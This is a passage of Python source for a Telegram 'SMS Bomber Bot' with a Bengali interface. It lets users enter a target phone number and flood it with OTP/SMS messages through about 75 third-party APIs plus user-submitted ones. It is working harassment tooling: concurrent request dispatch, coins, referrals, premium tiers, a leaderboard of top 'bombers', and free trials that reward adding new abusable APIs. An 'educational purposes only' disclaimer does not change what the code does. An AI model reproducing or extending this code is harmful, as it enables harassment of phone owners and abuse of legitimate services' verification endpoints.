            
            if i % 10 == 0:
                await progress_msg.edit_text(f"⏳ ব্রডকাস্ট চলছে... {i}/{len(users)}")
            
            await asyncio.sleep(0.1)
        
        await progress_msg.edit_text(f"✅ ব্রডকাস্ট সম্পন্ন!\n📨 সফল: {sent}\n❌ ব্যর্থ: {failed}")
    
    # ====================== স্মার্ট বোমা ======================
    
    async def send_bomb_smart(self, update, context, phone, count):
        message = await update.message.reply_text("⏳ প্রস্তুত হচ্ছে...")
        
        all_apis = self.apis.get_all_apis()
        
        # ইউজারের কাস্টম API গুলো যোগ করা
        user_id = update.effective_user.id
        self.db.cursor.execute("SELECT name, url, method, headers, body FROM custom_apis WHERE user_id = ? AND is_active = 1", (user_id,))
        custom_apis = self.db.cursor.fetchall()
        
        for custom_api in custom_apis:
            try:
                api = {
                    "name": custom_api[0],
                    "url": custom_api[1],
                    "method": custom_api[2],
                    "headers": json.loads(custom_api[3]) if custom_api[3] else {},
                    "body": json.loads(custom_api[4]) if custom_api[4] else {}
                }
                all_apis.append(api)
            except:
                pass
        
        # ফ্রি ট্রায়াল চেক
        is_free_trial = self.db.check_free_trial(user_id)
        
        # যতগুলো API দরকার ততগুলো নেওয়া
        total_apis = len(all_apis)
        if count > total_apis:
            count = total_apis
        
        selected_apis = random.sample(all_apis, count)
        
        success_count = 0
        fail_count = 0
        results = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for api in selected_apis:
                api_copy = api.copy()
                if "body" in api_copy:
                    body = api_copy["body"]
                    for key in body:
                        if isinstance(body[key], str):
                            body[key] = body[key].replace("{phone}", phone)
                future = executor.submit(self.apis.send_request, api_copy, phone)
                futures.append((api, future))
            
            completed = 0
            total = len(futures)
            
            for api, future in futures:
                try:
                    success = future.result(timeout=10)
                    completed += 1
                    
                    if success:
                        success_count += 1
                        results.append(f"✅ {api['name']}")
                        self.db.update_api_stats(api['name'], True)
                    else:
                        fail_count += 1
                        results.append(f"❌ {api['name']}")
                        self.db.update_api_stats(api['name'], False)
                    
                    # লাইভ প্রোগ্রেস বার
                    progress = int(completed / total * 100)
                    bar = "▓" * (progress // 2) + "░" * (50 - progress // 2)
                    
                    if completed % 3 == 0 or completed == total:
                        await message.edit_text(
                            f"📨 **SMS পাঠানো হচ্ছে...**\n\n"
                            f"`{bar}` {progress}%\n"
                            f"📊 {completed}/{total}\n"
                            f"✅ সফল: {success_count} | ❌ ব্যর্থ: {fail_count}"
                        )
                    
                    delay = self.smart_delay(api['name'], 1)
                    time.sleep(delay)
                    
                except Exception as e:
                    fail_count += 1
                    results.append(f"❌ {api['name']} (Error)")
        
        # ফ্রি ট্রায়াল শেষে নোটিফিকেশন
        if is_free_trial:
            await update.message.reply_text("🎁 আপনার ফ্রি ট্রায়াল শেষ! নতুন API অ্যাড করে আবার ফ্রি ট্রায়াল নিন।")
        
        return success_count, fail_count, results
    
    # ====================== কোর হ্যান্ডলার ======================
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        user_id = user.id
        self.db.add_user(user_id, user.username, user.first_name)
        
        # ওয়েলকাম ইমেজ পাঠানো
        try:
            if os.path.exists(self.WELCOME_IMAGE):
                with open(self.WELCOME_IMAGE, 'rb') as photo:
                    await update.message.reply_photo(
                        photo=InputFile(photo),
                        caption=f"👋 হ্যালো {user.first_name}! SMS Bomber Bot এ স্বাগতম!"
                    )
            else:
                await update.message.reply_text(f"👋 হ্যালো {user.first_name}!")
        except:
            await update.message.reply_text(f"👋 হ্যালো {user.first_name}!")
        
        if not await self.check_channel_membership(user_id):
            await update.message.reply_text(
                f"⚠️ এই বট ব্যবহার করতে হলে আমাদের চ্যানেলে জয়েন করতে হবে!\n\n"
                f"নিচের বাটনে ক্লিক করে চ্যানেল জয়েন করুন তারপর 'চেক করুন' বাটনে ক্লিক করুন।",
                reply_markup=self.get_join_keyboard()
            )
            return
        
        welcome_text = f"""
🔥 **SMS Bomber Bot**

👋 হ্যালো {user.first_name}!

📱 এই বট দিয়ে আপনি যেকোনো নম্বরে ৭৫টি ভিন্ন ভিন্ন API থেকে OTP/SMS পাঠাতে পারবেন।

🪙 **কয়েন সিস্টেম:**
• ১টি SMS = ১ কয়েন
• প্রতিদিন বোনাস: {self.DAILY_BONUS} কয়েন
• রেফারেল বোনাস: {self.REFERRAL_BONUS} কয়েন

🎁 **ফ্রি ট্রায়াল:**
• ১টি কাস্টম API অ্যাড করলে ১ দিন ফ্রি

⚡ **মনে রাখবেন:**
• বটটি শুধুমাত্র শিক্ষাগত উদ্দেশ্যে
• কারও বিরুদ্ধে ব্যবহার করা অবৈধ

নিচের মেনু থেকে আপনার কাজ নির্বাচন করুন।
"""
        await update.message.reply_text(welcome_text, reply_markup=self.get_enhanced_main_keyboard())
    
    async def check_join_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        if await self.check_channel_membership(user_id):
            await query.edit_message_text(
                "✅ চ্যানেল জয়েন সফল! এখন আপনি বট ব্যবহার করতে পারবেন।\n\n"
                "নিচের মেনু থেকে আপনার কাজ নির্বাচন করুন।",
                reply_markup=self.get_enhanced_main_keyboard()
            )
        else:
            await query.edit_message_text(
                "❌ আপনি এখনও চ্যানেল জয়েন করেননি!\n\n"
                "দয়া করে নিচের লিংকে ক্লিক করে চ্যানেল জয়েন করুন এবং আবার চেক করুন।",
                reply_markup=self.get_join_keyboard()
            )
    
    async def coins_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        coins = self.db.get_coins(user_id)
        
        keyboard = [
            [InlineKeyboardButton("🔄 ডেইলি বোনাস", callback_data="daily_bonus")],
            [InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]
        ]
        
        await query.edit_message_text(
            f"🪙 **আপনার কয়েন:** {coins}\n\n"
            f"📊 **কয়েন পাওয়ার উপায়:**\n"
            f"• ১টি SMS = +{self.COINS_PER_SMS} কয়েন\n"
            f"• ডেইলি বোনাস = +{self.DAILY_BONUS} কয়েন\n"
            f"• রেফারেল = +{self.REFERRAL_BONUS} কয়েন\n\n"
            f"⭐ **প্রিমিয়াম:** {self.PREMIUM_PRICE} কয়েন",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    async def daily_bonus_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        last_bonus = context.user_data.get("last_bonus", datetime.min)
        now = datetime.now()
        
        if (now - last_bonus).days >= 1:
            self.db.update_coins(user_id, self.DAILY_BONUS)
            context.user_data["last_bonus"] = now
            
            await query.edit_message_text(
                f"✅ ডেইলি বোনাস সফল!\n"
                f"🪙 +{self.DAILY_BONUS} কয়েন পেয়েছেন!\n"
                f"📊 মোট কয়েন: {self.db.get_coins(user_id)}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="coins")]])
            )
        else:
            remaining = timedelta(days=1) - (now - last_bonus)
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            
            await query.edit_message_text(
                f"⏳ আপনি ইতিমধ্যে ডেইলি বোনাস নিয়েছেন!\n\n"
                f"পরবর্তী বোনাস পেতে অপেক্ষা করুন: {hours} ঘন্টা {minutes} মিনিট",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="coins")]])
            )
    
    async def stats_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        stats = self.db.get_stats(user_id)
        coins = self.db.get_coins(user_id)
        
        self.db.cursor.execute("SELECT COUNT(*) FROM users")
        total_users = self.db.cursor.fetchone()[0]
        
        await query.edit_message_text(
            f"📊 **আপনার স্ট্যাটাস**\n\n"
            f"👤 ইউজার আইডি: `{user_id}`\n"
            f"🪙 কয়েন: {coins}\n"
            f"📨 মোট SMS: {stats[0] if stats else 0}\n"
            f"👥 মোট ইউজার: {total_users}\n"
            f"⭐ প্রিমিয়াম: {'✅ হ্যাঁ' if stats and stats[1] > 0 else '❌ না'}\n"
            f"🎁 ফ্রি ট্রায়াল: {'✅ সক্রিয়' if self.db.check_free_trial(user_id) else '❌ নেই'}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]])
        )
    
    async def refer_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        bot_username = context.bot.username
        refer_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
        
        await query.edit_message_text(
            f"👥 **রেফারেল প্রোগ্রাম**\n\n"
            f"প্রতি রেফারেলের জন্য পান: +{self.REFERRAL_BONUS} কয়েন\n\n"
            f"আপনার রেফারেল লিংক:\n`{refer_link}`\n\n"
            f"এই লিংকটি শেয়ার করে বন্ধুদের আমন্ত্রণ জানান!",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📤 শেয়ার করুন", switch_inline_query=refer_link)],
                [InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]
            ])
        )
    
    async def leaderboard_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        self.db.cursor.execute("""
            SELECT username, total_sent, coins 
            FROM users 
            WHERE total_sent > 0
            ORDER BY total_sent DESC 
            LIMIT 10
        """)
        leaders = self.db.cursor.fetchall()
        
        text = "🏆 **টপ ১০ বোম্বার**\n\n"
        medals = ["🥇", "🥈", "🥉"]
        
        for i, (username, total, coins) in enumerate(leaders):
            medal = medals[i] if i < 3 else f"{i+1}."
            name = f"@{username}" if username else f"User #{i+1}"
            text += f"{medal} {name}\n   📨 {total} SMS | 🪙 {coins}\n\n"
        
        keyboard = [[InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    async def premium_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        coins = self.db.get_coins(user_id)
        
        if coins >= self.PREMIUM_PRICE:
            keyboard = [
                [InlineKeyboardButton("⭐ প্রিমিয়াম কিনুন", callback_data="buy_premium")],
                [InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]
            ]
            await query.edit_message_text(
                f"⭐ **প্রিমিয়াম ফিচার:**\n\n"
                f"• Unlimited SMS (কোন কয়েন লাগবে না)\n"
                f"• ৭৫টি API অ্যাক্সেস (সবগুলো)\n"
                f"• কাস্টম API অ্যাড করার সুবিধা\n"
                f"• প্রায়োরিটি সাপোর্ট\n\n"
                f"**মূল্য:** {self.PREMIUM_PRICE} কয়েন\n"
                f"আপনার কয়েন: {coins}\n\n"
                f"প্রিমিয়াম কিনতে নিচের বাটনে ক্লিক করুন।",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await query.edit_message_text(
                f"❌ আপনার পর্যাপ্ত কয়েন নেই!\n\n"
                f"প্রিমিয়ামের জন্য প্রয়োজন: {self.PREMIUM_PRICE} কয়েন\n"
                f"আপনার আছে: {coins} কয়েন\n\n"
                f"কয়েন বাড়ানোর উপায়:\n"
                f"• SMS পাঠান (+{self.COINS_PER_SMS} কয়েন)\n"
                f"• ডেইলি বোনাস নিন (+{self.DAILY_BONUS} কয়েন)\n"
                f"• রেফারেল করুন (+{self.REFERRAL_BONUS} কয়েন)",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="coins")]])
            )
    
    async def buy_premium_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        coins = self.db.get_coins(user_id)
        
        if coins >= self.PREMIUM_PRICE:
            self.db.update_coins(user_id, -self.PREMIUM_PRICE)
            self.db.cursor.execute("UPDATE users SET is_premium = 1 WHERE user_id = ?", (user_id,))
            self.db.conn.commit()
            
            await query.edit_message_text(
                f"✅ **প্রিমিয়াম সক্রিয়!**\n\n"
                f"🎉 আপনার এখন Unlimited SMS সুবিধা পাচ্ছেন!\n"
                f"🪙 বাকি কয়েন: {self.db.get_coins(user_id)}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]])
            )
        else:
            await query.edit_message_text(
                "❌ পর্যাপ্ত কয়েন নেই!",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="premium")]])
            )
    
    async def free_trial_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        # ইউজারের কাস্টম API চেক
        self.db.cursor.execute("SELECT COUNT(*) FROM custom_apis WHERE user_id = ?", (user_id,))
        api_count = self.db.cursor.fetchone()[0]
        
        if api_count == 0:
            await query.edit_message_text(
                f"🎁 **ফ্রি ট্রায়াল**\n\n"
                f"আপনি এখনও কোনো কাস্টম API অ্যাড করেননি!\n\n"
                f"১টি কাস্টম API অ্যাড করলে ১ দিন ফ্রি ট্রায়াল পাবেন।\n\n"
                f"🔧 কাস্টম API অ্যাড করতে 'কাস্টম API' বাটনে ক্লিক করুন।",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔧 কাস্টম API", callback_data="custom_api")],
                    [InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]
                ])
            )
            return
        
        if self.db.check_free_trial(user_id):
            await query.edit_message_text(
                f"🎁 **ফ্রি ট্রায়াল সক্রিয়!**\n\n"
                f"আপনি এখন ফ্রি ট্রায়াল ব্যবহার করছেন!\n"
                f"আজকে যত খুশি SMS পাঠাতে পারবেন।",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]])
            )
        else:
            # ফ্রি ট্রায়াল অ্যাক্টিভেট
            self.db.cursor.execute("SELECT id FROM custom_apis WHERE user_id = ? LIMIT 1", (user_id,))
            api_id = self.db.cursor.fetchone()
            if api_id:
                self.db.add_free_trial(user_id, api_id[0])
                await query.edit_message_text(
                    f"🎁 **ফ্রি ট্রায়াল সক্রিয়!**\n\n"
                    f"✅ আপনি ১ দিনের ফ্রি ট্রায়াল পেয়েছেন!\n"
                    f"📅 আজকে যত খুশি SMS পাঠাতে পারবেন।",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]])
                )
            else:
                await query.edit_message_text(
                    "❌ কিছু সমস্যা হয়েছে! আবার চেষ্টা করুন।",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]])
                )
    
    async def custom_api_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        await query.edit_message_text(
            "🔧 **কাস্টম API যোগ করুন**\n\n"
            "ফরম্যাট:\n"
            "`নাম|URL|মেথড|হেডার|বডি`\n\n"
            "উদাহরণ:\n"
            "`MyAPI|https://api.com|POST|Content-Type:json|{\"phone\":\"{phone}\"}`\n\n"
            "হেডার একাধিক হলে `;` দিয়ে আলাদা করুন।\n\n"
            "🎁 ১টি API অ্যাড করলে ১ দিন ফ্রি ট্রায়াল!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]])
        )
        context.user_data["waiting_custom_api"] = True
    
    async def handle_custom_api(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.user_data.get("waiting_custom_api"):
            return
        
        user_id = update.effective_user.id
        text = update.message.text
        
        try:
            parts = text.split("|")
            if len(parts) >= 4:
                name, url, method, headers_str = parts[:4]
                body = parts[4] if len(parts) > 4 else "{}"
                
                headers = {}
                if headers_str:
                    for h in headers_str.split(";"):
                        if ":" in h:
                            k, v = h.split(":", 1)
                            headers[k.strip()] = v.strip()
                
                self.db.cursor.execute(
                    "INSERT INTO custom_apis (user_id, name, url, method, headers, body, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (user_id, name, url, method, json.dumps(headers), body, datetime.now().isoformat())
                )
                self.db.conn.commit()
                
                # ফ্রি ট্রায়াল দেওয়া
                api_id = self.db.cursor.lastrowid
                self.db.add_free_trial(user_id, api_id)
                
                await update.message.reply_text(
                    f"✅ **কাস্টম API যোগ সফল!**\n\n"
                    f"📌 নাম: {name}\n"
                    f"🔗 URL: {url}\n"
                    f"📝 মেথড: {method}\n\n"
                    f"🎁 আপনি ১ দিনের ফ্রি ট্রায়াল পেয়েছেন!",
                    reply_markup=self.get_enhanced_main_keyboard()
                )
            else:
                await update.message.reply_text(
                    "❌ **ভুল ফরম্যাট!**\n"
                    "দয়া করে সঠিক ফরম্যাটে দিন:\n"
                    "`নাম|URL|মেথড|হেডার|বডি`"
                )
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        
        context.user_data["waiting_custom_api"] = False
    
    async def send_bomb_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        
        if not await self.check_channel_membership(user_id):
            await query.edit_message_text("⚠️ চ্যানেল জয়েন করতে হবে!", reply_markup=self.get_join_keyboard())
            return
        
        coins = self.db.get_coins(user_id)
        user_data = self.db.get_user(user_id)
        is_premium = user_data[8] == 1 if user_data else False
        is_free_trial = self.db.check_free_trial(user_id)
        
        if coins < 5 and not is_premium and not is_free_trial:
            await query.edit_message_text(
                f"❌ পর্যাপ্ত কয়েন নেই!\n\n"
                f"আপনার কয়েন: {coins}\n"
                f"নূন্যতম প্রয়োজন: ৫ কয়েন\n\n"
                f"কয়েন বাড়ানোর উপায়:\n"
                f"• ডেইলি বোনাস নিন\n"
                f"• রেফারেল করুন\n"
                f"• ফ্রি ট্রায়াল নিন",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="coins")]])
            )
            return
        
        await query.edit_message_text(
            f"📱 **SMS বোমা**\n\n"
            f"কতটি SMS পাঠাতে চান?\n\n"
            f"🪙 কয়েন প্রয়োজন: {self.COINS_PER_SMS} কয়েন/SMS\n"
            f"📊 আপনার কয়েন: {coins}\n"
            f"⭐ প্রিমিয়াম: {'✅' if is_premium else '❌'}\n"
            f"🎁 ফ্রি ট্রায়াল: {'✅' if is_free_trial else '❌'}",
            reply_markup=self.get_custom_count_keyboard()
        )
    
    async def count_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        count = int(query.data.split("_")[1])
        
        context.user_data["target_count"] = count
        context.user_data["waiting_phone"] = True
        
        coins = self.db.get_coins(user_id)
        coins_needed = count * self.COINS_PER_SMS
        
        await query.edit_message_text(
            f"📱 **{count}টি SMS পাঠাতে হবে**\n\n"
            f"📞 এখন টার্গেট ফোন নম্বর দিন:\n"
            f"(উদাহরণ: 017xxxxxxxx)\n\n"
            f"🪙 প্রয়োজনীয় কয়েন: {coins_needed}\n"
            f"📊 আপনার কয়েন: {coins}\n\n"
            f"নম্বর পাঠান অথবা /cancel দিয়ে বাতিল করুন।",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 বাতিল", callback_data="back_main")]])
        )
    
    async def custom_count_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        await query.edit_message_text(
            "✏️ **কাস্টম কাউন্ট**\n\n"
            "কতটি SMS পাঠাতে চান তা লিখুন:\n"
            "(১-৭৫ এর মধ্যে)\n\n"
            "উদাহরণ: `50`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="send_bomb")]])
        )
        context.user_data["waiting_custom_count"] = True
    
    async def handle_custom_count(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.user_data.get("waiting_custom_count"):
            return
        
        try:
            count = int(update.message.text.strip())
            if 1 <= count <= 75:
                context.user_data["target_count"] = count
                context.user_data["waiting_phone"] = True
                context.user_data["waiting_custom_count"] = False
                
                user_id = update.effective_user.id
                coins = self.db.get_coins(user_id)
                coins_needed = count * self.COINS_PER_SMS
                
                await update.message.reply_text(
                    f"📱 **{count}টি SMS পাঠাতে হবে**\n\n"
                    f"📞 এখন টার্গেট ফোন নম্বর দিন:\n"
                    f"(উদাহরণ: 017xxxxxxxx)\n\n"
                    f"🪙 প্রয়োজনীয় কয়েন: {coins_needed}\n"
                    f"📊 আপনার কয়েন: {coins}\n\n"
                    f"নম্বর পাঠান অথবা /cancel দিয়ে বাতিল করুন।",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 বাতিল", callback_data="back_main")]])
                )
            else:
                await update.message.reply_text("❌ ১-৭৫ এর মধ্যে সংখ্যা দিন!")
        except:
            await update.message.reply_text("❌ সঠিক সংখ্যা দিন!")
    
    async def handle_phone_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.user_data.get("waiting_phone"):
            return
        
        user_id = update.effective_user.id
        phone = update.message.text.strip()
        
        # ফোন নম্বর ভ্যালিডেশন
        if not phone.isdigit() or len(phone) < 10:
            await update.message.reply_text(
                "❌ ভুল নম্বর!\n"
                "শুধু সংখ্যা দিন (উদাহরণ: 017xxxxxxxx)\n"
                "আবার চেষ্টা করুন অথবা /cancel দিয়ে বাতিল করুন।"
            )
            return
        
        count = context.user_data.get("target_count", 10)
        user_data = self.db.get_user(user_id)
        is_premium = user_data[8] == 1 if user_data else False
        is_free_trial = self.db.check_free_trial(user_id)
        coins_needed = count * self.COINS_PER_SMS
        
        coins = self.db.get_coins(user_id)
        if not is_premium and not is_free_trial and coins < coins_needed:
            await update.message.reply_text(
                f"❌ পর্যাপ্ত কয়েন নেই!\n\n"
                f"প্রয়োজন: {coins_needed}\n"
                f"আপনার: {coins}\n\n"
                f"{coins_needed - coins} কয়েন কম আছে।\n"
                f"ফ্রি ট্রায়াল নিন বা কয়েন বাড়ান।",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🎁 ফ্রি ট্রায়াল", callback_data="free_trial")],
                    [InlineKeyboardButton("🔙 ব্যাক", callback_data="send_bomb")]
                ])
            )
            return
        
        await update.message.reply_text(f"⏳ {count}টি SMS পাঠানো হচ্ছে... দয়া করে অপেক্ষা করুন।")
        
        success_count, fail_count, results = await self.send_bomb_smart(update, context, phone, count)
        
        # কয়েন আপডেট (ফ্রি ট্রায়াল বা প্রিমিয়াম হলে কয়েন কাটবে না)
        if not is_premium and not is_free_trial:
            self.db.update_coins(user_id, count)
        
        self.db.add_log(user_id, phone, count, success_count)
        
        # টোটাল সেন্ট আপডেট
        self.db.cursor.execute("UPDATE users SET total_sent = total_sent + ? WHERE user_id = ?", (count, user_id))
        self.db.conn.commit()
        
        # অ্যাচিভমেন্ট চেক
        user_data = self.db.get_user(user_id)
        total_sent = user_data[4] if user_data else 0
        new_achievements = self.check_achievements(user_id, total_sent)
        
        result_text = self.format_result_message(phone, count, success_count, fail_count, results)
        
        if new_achievements:
            result_text += f"\n\n🏅 **নতুন অ্যাচিভমেন্ট:**\n{chr(10).join(new_achievements)}"
        
        await update.message.reply_text(result_text, reply_markup=self.get_enhanced_main_keyboard())
        
        context.user_data["waiting_phone"] = False
        context.user_data["target_count"] = 0
    
    async def language_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            "🌐 **ভাষা নির্বাচন করুন / Select Language**",
            reply_markup=self.get_language_keyboard()
        )
    
    async def set_language_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        lang_code = query.data.split("_")[1]
        context.user_data["language"] = lang_code
        
        self.db.cursor.execute("UPDATE users SET language = ? WHERE user_id = ?", (lang_code, query.from_user.id))
        self.db.conn.commit()
        
        await query.edit_message_text(
            f"✅ ভাষা সেট করা হয়েছে: {lang_code.upper()}",
            reply_markup=self.get_enhanced_main_keyboard()
        )
    
    async def help_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        help_text = """
📖 **সাহায্য/গাইড**

🔰 **কিভাবে ব্যবহার করবেন:**
1. 'SMS বোমা' সিলেক্ট করুন
2. কতটি SMS পাঠাবেন সিলেক্ট করুন (১০-৫০০ অথবা কাস্টম)
3. টার্গেট নম্বর দিন (উদাহরণ: 017xxxxxxxx)
4. লাইভ প্রোগ্রেস বার দেখুন!

🪙 **কয়েন সিস্টেম:**
• ১টি SMS = ১ কয়েন
• ডেইলি বোনাস = ৫ কয়েন
• রেফারেল = ১০ কয়েন

⭐ **প্রিমিয়াম সুবিধা:**
• Unlimited SMS (কোন কয়েন লাগবে না)
• ৭৫টি API
• কাস্টম API অ্যাড করার সুবিধা
• প্রায়োরিটি সাপোর্ট

🎁 **ফ্রি ট্রায়াল:**
• ১টি কাস্টম API অ্যাড করলে ১ দিন ফ্রি
• ফ্রি ট্রায়ালে Unlimited SMS

⚠️ **সতর্কতা:**
• এই বট শুধুমাত্র শিক্ষাগত উদ্দেশ্যে
• কারও বিরুদ্ধে ব্যবহার আইনত দণ্ডনীয়
• অপব্যবহার করলে ব্লক করা হবে

📢 **আমাদের চ্যানেল:** @BlackoutZoneRBX404
"""
        await query.edit_message_text(help_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]]))
    
    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data["waiting_phone"] = False
        context.user_data["target_count"] = 0
        context.user_data["waiting_custom_api"] = False
        context.user_data["waiting_custom_count"] = False
        await update.message.reply_text("❌ বাতিল করা হয়েছে!", reply_markup=self.get_enhanced_main_keyboard())
    
    async def back_main_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user = query.from_user
        
        welcome_text = f"""
🔥 **SMS Bomber Bot**

👋 হ্যালো {user.first_name}!

আপনার কাজ নির্বাচন করুন:
"""
        await query.edit_message_text(welcome_text, reply_markup=self.get_enhanced_main_keyboard())
    
    async def admin_dashboard_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        await self.admin_dashboard(update, context)
    
    # ====================== জব সেটআপ ======================
    
    async def check_daily_bonus_reminder(self, context: ContextTypes.DEFAULT_TYPE):
        self.db.cursor.execute("SELECT user_id FROM users WHERE date(last_active) < date('now')")
        users = self.db.cursor.fetchall()
        
        for (user_id,) in users:
            try:
                await context.bot.send_message(
                    user_id,
                    "🪙 **ডেইলি বোনাস রিমাইন্ডার!**\n\n"
                    "আজকের বোনাস নিতে ভুলবেন না!\n"
                    "মেনুতে গিয়ে 'কয়েন' সেকশনে ক্লিক করুন।"
                )
                await asyncio.sleep(0.1)
            except:
                pass
    
    async def premium_expiry_check(self, context: ContextTypes.DEFAULT_TYPE):
        expiry_date = datetime.now() - timedelta(days=30)
        self.db.cursor.execute("""
            SELECT user_id FROM users 
            WHERE is_premium = 1 AND date(join_date) < date(?)
        """, (expiry_date.isoformat(),))
        expired_users = self.db.cursor.fetchall()
        
        for (user_id,) in expired_users:
            self.db.cursor.execute("UPDATE users SET is_premium = 0 WHERE user_id = ?", (user_id,))
            self.db.conn.commit()
            try:
                await context.bot.send_message(
                    user_id,
                    "⏰ **প্রিমিয়াম মেয়াদ শেষ!**\n\n"
                    "আপনার প্রিমিয়াম সাবস্ক্রিপশন শেষ হয়েছে।\n"
                    "আবার প্রিমিয়াম নিতে 'প্রিমিয়াম' সেকশনে যান।"
                )
            except:
                pass
    
    async def backup_stats(self, context: ContextTypes.DEFAULT_TYPE):
        self.db.cursor.execute("SELECT COUNT(*), SUM(total_sent), SUM(coins) FROM users")
        result = self.db.cursor.fetchone()
        total_users = result[0] if result and result[0] else 0
        total_sms = result[1] if result and result[1] else 0
        total_coins = result[2] if result and result[2] else 0
        
        backup_data = {
            "timestamp": datetime.now().isoformat(),
            "total_users": total_users,
            "total_sms": total_sms,
            "total_coins": total_coins
        }
        
        with open(f"backup_{datetime.now().strftime('%Y%m%d')}.json", "w") as f:
            json.dump(backup_data, f)
        
        for admin_id in self.ADMIN_IDS:
            try:
                await context.bot.send_message(
                    admin_id,
                    f"📊 **ডেইলি ব্যাকআপ সফল!**\n\n"
                    f"👥 ইউজার: {backup_data['total_users']}\n"
                    f"📨 SMS: {backup_data['total_sms']}\n"
                    f"🪙 কয়েন: {backup_data['total_coins']}"
                )
            except:
                pass
    
    async def free_trial_expiry_check(self, context: ContextTypes.DEFAULT_TYPE):
        self.db.cursor.execute("""
            SELECT user_id FROM users 
            WHERE is_free_trial = 1 AND date(free_trial_expiry) < date('now')
        """)
        expired_trials = self.db.cursor.fetchall()
        
        for (user_id,) in expired_trials:
            self.db.cursor.execute("UPDATE users SET is_free_trial = 0 WHERE user_id = ?", (user_id,))
            self.db.conn.commit()
            try:
                await context.bot.send_message(
                    user_id,
                    "⏰ **ফ্রি ট্রায়াল শেষ!**\n\n"
                    "আপনার ফ্রি ট্রায়াল শেষ হয়েছে।\n"
                    "আবার ফ্রি ট্রায়াল পেতে নতুন কাস্টম API অ্যাড করুন।"
                )
            except:
                pass
    
    def setup_jobs(self):
        if self.app and self.app.job_queue:
            job_queue = self.app.job_queue
            job_queue.run_repeating(self.check_daily_bonus_reminder, interval=86400, first=10)
            job_queue.run_repeating(self.premium_expiry_check, interval=21600, first=30)
            job_queue.run_repeating(self.free_trial_expiry_check, interval=3600, first=60)
